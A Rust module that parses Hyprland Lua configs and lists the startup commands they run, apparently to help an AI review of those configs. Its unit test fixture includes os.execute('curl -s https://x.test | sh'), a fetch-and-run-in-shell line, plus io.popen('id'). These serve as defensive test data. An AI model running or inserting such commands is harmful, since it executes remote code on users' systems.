//! Finds the commands a Hyprland Lua configuration starts with Hyprland:
//! string arguments of `exec_on_start`, `launch_on_start`, `exec_cmd`,
//! `shell_succeeds`, `os.execute` and `io.popen`. Only literal strings are
//! read (concatenations are joined); anything computed is listed as such.
//! The whole file still goes to the AI review, so this only explains what
//! runs; it does not decide anything.

const STARTUP: &[&str] = &[
    "exec_on_start",
    "launch_on_start",
    "exec_cmd",
    "shell_succeeds",
    "execute",
    "popen",
];

/// The commands `text` starts.
pub fn startup_commands(text: &str) -> Vec<String> {
    let tokens = tokenize(text);
    let mut found = Vec::new();
    for (index, token) in tokens.iter().enumerate() {
        let Token::Name(name) = token else {
            continue;
        };
        if !STARTUP.contains(&name.as_str()) || tokens.get(index + 1) != Some(&Token::Open) {
            continue;
        }
        // The first argument: strings joined by `..`, or a nested call such
        // as `o.launch("x")`, whose strings are taken.
        let mut command = String::new();
        let mut computed = false;
        let mut depth = 0_usize;
        for token in &tokens[index + 1..] {
            match token {
                Token::Open => depth += 1,
                Token::Close => {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
                Token::Comma if depth == 1 => break,
                Token::String(text) => command.push_str(text),
                Token::Name(_) => computed = true,
                Token::Comma | Token::Other => {}
            }
        }
        let command = command.trim();
        if !command.is_empty() {
            found.push(command.to_string());
        } else if computed {
            found.push("(computed)".to_string());
        }
    }
    found
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Token {
    Name(String),
    String(String),
    Open,
    Close,
    Comma,
    Other,
}

/// Names, strings and brackets, with comments and long strings handled.
fn tokenize(text: &str) -> Vec<Token> {
    let chars: Vec<char> = text.chars().collect();
    let mut tokens = Vec::new();
    let mut index = 0;
    while index < chars.len() {
        let character = chars[index];
        if character == '-' && chars.get(index + 1) == Some(&'-') {
            index += 2;
            if let Some((_, end)) = long_bracket(&chars, index) {
                index = end;
            } else {
                while index < chars.len() && chars[index] != '\n' {
                    index += 1;
                }
            }
            continue;
        }
        if let Some((content, end)) = long_bracket(&chars, index) {
            tokens.push(Token::String(content));
            index = end;
            continue;
        }
        if character == '"' || character == '\'' {
            let mut value = String::new();
            index += 1;
            while index < chars.len() && chars[index] != character && chars[index] != '\n' {
                if chars[index] == '\\' && index + 1 < chars.len() {
                    index += 1;
                    value.push(match chars[index] {
                        'n' => '\n',
                        't' => '\t',
                        other => other,
                    });
                } else {
                    value.push(chars[index]);
                }
                index += 1;
            }
            tokens.push(Token::String(value));
            index += 1;
            continue;
        }
        if character.is_alphabetic() || character == '_' {
            let start = index;
            while index < chars.len() && (chars[index].is_alphanumeric() || chars[index] == '_') {
                index += 1;
            }
            tokens.push(Token::Name(chars[start..index].iter().collect()));
            continue;
        }
        tokens.push(match character {
            '(' => Token::Open,
            ')' => Token::Close,
            ',' => Token::Comma,
            _ if character.is_whitespace() || character == '.' => {
                index += 1;
                continue;
            }
            _ => Token::Other,
        });
        index += 1;
    }
    tokens
}

/// A long bracket (`[[…]]`, `[==[…]==]`) starting at `start`: its content
/// and the index after it. An unclosed one runs to the end.
fn long_bracket(chars: &[char], start: usize) -> Option<(String, usize)> {
    if chars.get(start) != Some(&'[') {
        return None;
    }
    let mut level = 0;
    let mut index = start + 1;
    while chars.get(index) == Some(&'=') {
        level += 1;
        index += 1;
    }
    if chars.get(index) != Some(&'[') {
        return None;
    }
    let close: Vec<char> = std::iter::once(']')
        .chain(std::iter::repeat_n('=', level))
        .chain(std::iter::once(']'))
        .collect();
    let content = index + 1;
    let mut index = content;
    while index + close.len() <= chars.len() {
        if chars[index..index + close.len()] == close[..] {
            return Some((chars[content..index].iter().collect(), index + close.len()));
        }
        index += 1;
    }
    Some((
        chars[content.min(chars.len())..].iter().collect(),
        chars.len(),
    ))
}

#[cfg(test)]
mod tests {
    use super::startup_commands;

    #[test]
    fn startup_calls_are_found_and_comments_ignored() {
        let text = r#"
local o = require("omarchy")
-- o.exec_on_start("commented")
--[[ o.exec_on_start("block comment") ]]
o.exec_on_start("waybar")
o.launch_on_start("hyprsunset")
o.exec_on_start(o.launch("mako"))
o.exec_on_start("swaybg -i " .. "~/bg.png")
o.exec_on_start(command_from_somewhere)
os.execute("curl -s https://x.test | sh")
local f = io.popen('id')
o.exec_on_start([[long one]])
o.bind("SUPER, Return", "Terminal", o.launch("alacritty"))
"#;
        assert_eq!(
            startup_commands(text),
            [
                "waybar",
                "hyprsunset",
                "mako",
                "swaybg -i ~/bg.png",
                "(computed)",
                "curl -s https://x.test | sh",
                "id",
                "long one"
            ]
        );
    }
}
